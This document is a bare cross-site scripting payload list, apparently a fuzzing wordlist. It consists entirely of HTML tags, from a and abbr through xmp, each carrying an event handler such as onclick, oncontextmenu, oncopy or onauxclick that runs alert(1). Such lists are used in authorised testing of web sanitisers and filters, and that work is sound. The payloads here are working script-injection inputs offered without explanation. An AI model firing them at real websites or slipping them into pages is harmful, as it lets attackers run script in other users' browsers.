<input onauxclick=alert(1)>
<textarea onauxclick=alert(1)>XSS</textarea>
<param onclick="alert(1)">test</param>
<picture onclick="alert(1)">test</picture>
<plaintext onclick="alert(1)">test</plaintext>
<pre onclick="alert(1)">test</pre>
<progress onclick="alert(1)">test</progress>
<q onclick="alert(1)">test</q>
<rb onclick="alert(1)">test</rb>
<rp onclick="alert(1)">test</rp>
<rt onclick="alert(1)">test</rt>
<rtc onclick="alert(1)">test</rtc>
<ruby onclick="alert(1)">test</ruby>
<s onclick="alert(1)">test</s>
<samp onclick="alert(1)">test</samp>
<script onclick="alert(1)">test</script>
<section onclick="alert(1)">test</section>
<select onclick="alert(1)">test</select>
<shadow onclick="alert(1)">test</shadow>
<slot onclick="alert(1)">test</slot>
<small onclick="alert(1)">test</small>
<source onclick="alert(1)">test</source>
<spacer onclick="alert(1)">test</spacer>
<span onclick="alert(1)">test</span>
<strike onclick="alert(1)">test</strike>
<strong onclick="alert(1)">test</strong>
<style onclick="alert(1)">test</style>
<sub onclick="alert(1)">test</sub>
<summary onclick="alert(1)">test</summary>
<sup onclick="alert(1)">test</sup>
<svg onclick="alert(1)">test</svg>
<table onclick="alert(1)">test</table>
<tbody onclick="alert(1)">test</tbody>
<td onclick="alert(1)">test</td>
<template onclick="alert(1)">test</template>
<textarea onclick="alert(1)">test</textarea>
<tfoot onclick="alert(1)">test</tfoot>
<th onclick="alert(1)">test</th>
<thead onclick="alert(1)">test</thead>
<time onclick="alert(1)">test</time>
<title onclick="alert(1)">test</title>
<tr onclick="alert(1)">test</tr>
<track onclick="alert(1)">test</track>
<tt onclick="alert(1)">test</tt>
<u onclick="alert(1)">test</u>
<ul onclick="alert(1)">test</ul>
<var onclick="alert(1)">test</var>
<video onclick="alert(1)">test</video>
<wbr onclick="alert(1)">test</wbr>
<xmp onclick="alert(1)">test</xmp>
<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>
<xss oncontextmenu="alert(1)">test</xss>
<a oncontextmenu="alert(1)">test</a>
<abbr oncontextmenu="alert(1)">test</abbr>
<acronym oncontextmenu="alert(1)">test</acronym>
<address oncontextmenu="alert(1)">test</address>
<applet oncontextmenu="alert(1)">test</applet>
<area oncontextmenu="alert(1)">test</area>
<article oncontextmenu="alert(1)">test</article>
<aside oncontextmenu="alert(1)">test</aside>
<audio oncontextmenu="alert(1)">test</audio>
<b oncontextmenu="alert(1)">test</b>
<base oncontextmenu="alert(1)">test</base>
<basefont oncontextmenu="alert(1)">test</basefont>
<bdi oncontextmenu="alert(1)">test</bdi>
<bdo oncontextmenu="alert(1)">test</bdo>
<bgsound oncontextmenu="alert(1)">test</bgsound>
<big oncontextmenu="alert(1)">test</big>
<blink oncontextmenu="alert(1)">test</blink>
<blockquote oncontextmenu="alert(1)">test</blockquote>
<body oncontextmenu="alert(1)">test</body>
<br oncontextmenu="alert(1)">test</br>
<button oncontextmenu="alert(1)">test</button>
<canvas oncontextmenu="alert(1)">test</canvas>
<caption oncontextmenu="alert(1)">test</caption>
<center oncontextmenu="alert(1)">test</center>
<cite oncontextmenu="alert(1)">test</cite>
<code oncontextmenu="alert(1)">test</code>
<col oncontextmenu="alert(1)">test</col>
<colgroup oncontextmenu="alert(1)">test</colgroup>
<command oncontextmenu="alert(1)">test</command>
<content oncontextmenu="alert(1)">test</content>
<data oncontextmenu="alert(1)">test</data>
<datalist oncontextmenu="alert(1)">test</datalist>
<dd oncontextmenu="alert(1)">test</dd>
<del oncontextmenu="alert(1)">test</del>
<details oncontextmenu="alert(1)">test</details>
<dfn oncontextmenu="alert(1)">test</dfn>
<dialog oncontextmenu="alert(1)">test</dialog>
<dir oncontextmenu="alert(1)">test</dir>
<div oncontextmenu="alert(1)">test</div>
<dl oncontextmenu="alert(1)">test</dl>
<dt oncontextmenu="alert(1)">test</dt>
<element oncontextmenu="alert(1)">test</element>
<em oncontextmenu="alert(1)">test</em>
<embed oncontextmenu="alert(1)">test</embed>
<fieldset oncontextmenu="alert(1)">test</fieldset>
<figcaption oncontextmenu="alert(1)">test</figcaption>
<figure oncontextmenu="alert(1)">test</figure>
<font oncontextmenu="alert(1)">test</font>
<footer oncontextmenu="alert(1)">test</footer>
<form oncontextmenu="alert(1)">test</form>
<frame oncontextmenu="alert(1)">test</frame>
<frameset oncontextmenu="alert(1)">test</frameset>
<h1 oncontextmenu="alert(1)">test</h1>
<head oncontextmenu="alert(1)">test</head>
<header oncontextmenu="alert(1)">test</header>
<hgroup oncontextmenu="alert(1)">test</hgroup>
<hr oncontextmenu="alert(1)">test</hr>
<html oncontextmenu="alert(1)">test</html>
<i oncontextmenu="alert(1)">test</i>
<iframe oncontextmenu="alert(1)">test</iframe>
<image oncontextmenu="alert(1)">test</image>
<img oncontextmenu="alert(1)">test</img>
<input oncontextmenu="alert(1)">test</input>
<ins oncontextmenu="alert(1)">test</ins>
<isindex oncontextmenu="alert(1)">test</isindex>
<kbd oncontextmenu="alert(1)">test</kbd>
<keygen oncontextmenu="alert(1)">test</keygen>
<label oncontextmenu="alert(1)">test</label>
<legend oncontextmenu="alert(1)">test</legend>
<li oncontextmenu="alert(1)">test</li>
<link oncontextmenu="alert(1)">test</link>
<listing oncontextmenu="alert(1)">test</listing>
<main oncontextmenu="alert(1)">test</main>
<map oncontextmenu="alert(1)">test</map>
<mark oncontextmenu="alert(1)">test</mark>
<marquee oncontextmenu="alert(1)">test</marquee>
<menu oncontextmenu="alert(1)">test</menu>
<menuitem oncontextmenu="alert(1)">test</menuitem>
<meta oncontextmenu="alert(1)">test</meta>
<meter oncontextmenu="alert(1)">test</meter>
<multicol oncontextmenu="alert(1)">test</multicol>
<nav oncontextmenu="alert(1)">test</nav>
<nextid oncontextmenu="alert(1)">test</nextid>
<nobr oncontextmenu="alert(1)">test</nobr>
<noembed oncontextmenu="alert(1)">test</noembed>
<noframes oncontextmenu="alert(1)">test</noframes>
<noscript oncontextmenu="alert(1)">test</noscript>
<object oncontextmenu="alert(1)">test</object>
<ol oncontextmenu="alert(1)">test</ol>
<optgroup oncontextmenu="alert(1)">test</optgroup>
<option oncontextmenu="alert(1)">test</option>
<output oncontextmenu="alert(1)">test</output>
<p oncontextmenu="alert(1)">test</p>
<param oncontextmenu="alert(1)">test</param>
<picture oncontextmenu="alert(1)">test</picture>
<plaintext oncontextmenu="alert(1)">test</plaintext>
<pre oncontextmenu="alert(1)">test</pre>
<progress oncontextmenu="alert(1)">test</progress>
<q oncontextmenu="alert(1)">test</q>
<rb oncontextmenu="alert(1)">test</rb>
<rp oncontextmenu="alert(1)">test</rp>
<rt oncontextmenu="alert(1)">test</rt>
<rtc oncontextmenu="alert(1)">test</rtc>
<ruby oncontextmenu="alert(1)">test</ruby>
<s oncontextmenu="alert(1)">test</s>
<samp oncontextmenu="alert(1)">test</samp>
<script oncontextmenu="alert(1)">test</script>
<section oncontextmenu="alert(1)">test</section>
<select oncontextmenu="alert(1)">test</select>
<shadow oncontextmenu="alert(1)">test</shadow>
<slot oncontextmenu="alert(1)">test</slot>
<small oncontextmenu="alert(1)">test</small>
<source oncontextmenu="alert(1)">test</source>
<spacer oncontextmenu="alert(1)">test</spacer>
<span oncontextmenu="alert(1)">test</span>
<strike oncontextmenu="alert(1)">test</strike>
<strong oncontextmenu="alert(1)">test</strong>
<style oncontextmenu="alert(1)">test</style>
<sub oncontextmenu="alert(1)">test</sub>
<summary oncontextmenu="alert(1)">test</summary>
<sup oncontextmenu="alert(1)">test</sup>
<svg oncontextmenu="alert(1)">test</svg>
<table oncontextmenu="alert(1)">test</table>
<tbody oncontextmenu="alert(1)">test</tbody>
<td oncontextmenu="alert(1)">test</td>
<template oncontextmenu="alert(1)">test</template>
<textarea oncontextmenu="alert(1)">test</textarea>
<tfoot oncontextmenu="alert(1)">test</tfoot>
<th oncontextmenu="alert(1)">test</th>
<thead oncontextmenu="alert(1)">test</thead>
<time oncontextmenu="alert(1)">test</time>
<title oncontextmenu="alert(1)">test</title>
<tr oncontextmenu="alert(1)">test</tr>
<track oncontextmenu="alert(1)">test</track>
<tt oncontextmenu="alert(1)">test</tt>
<u oncontextmenu="alert(1)">test</u>
<ul oncontextmenu="alert(1)">test</ul>
<var oncontextmenu="alert(1)">test</var>
<video oncontextmenu="alert(1)">test</video>
<wbr oncontextmenu="alert(1)">test</wbr>
<xmp oncontextmenu="alert(1)">test</xmp>
<xss oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<a oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<abbr oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<acronym oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<address oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<applet oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<area oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<article oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<aside oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<audio oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<b oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<base oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<basefont oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<bdi oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<bdo oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<bgsound oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<big oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<blink oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<blockquote oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<body oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<br oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<button oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<canvas oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<caption oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<center oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<cite oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<code oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<col oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<colgroup oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<command oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<content oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<data oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<datalist oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<dd oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<del oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<details oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<dfn oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<dialog oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<dir oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<div oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<dl oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<dt oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<element oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<em oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<embed oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<fieldset oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<figcaption oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<figure oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<font oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<footer oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<form oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<frame oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<frameset oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<h1 oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<head oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<header oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<hgroup oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<hr oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<html oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<i oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<iframe oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<image oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<img oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<input oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<ins oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<isindex oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<kbd oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<keygen oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<label oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<legend oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<li oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<link oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<listing oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<main oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<map oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<mark oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<marquee oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<menu oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<menuitem oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<meta oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<meter oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<multicol oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<nav oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<nextid oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<nobr oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<noembed oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<noframes oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<noscript oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<object oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<ol oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<optgroup oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<option oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<output oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<p oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<param oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<picture oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<plaintext oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<pre oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<progress oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<q oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<rb oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<rp oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<rt oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<rtc oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<ruby oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<s oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<samp oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<script oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<section oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<select oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<shadow oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<slot oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<small oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<source oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<spacer oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<span oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<strike oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<strong oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<style oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<sub oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<summary oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<sup oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<svg oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<table oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<tbody oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<td oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<template oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<textarea oncopy=alert(1) value="XSS" autofocus tabindex=1>test
<tfoot oncopy=alert(1) value="XSS" autofocus tabindex=1>test
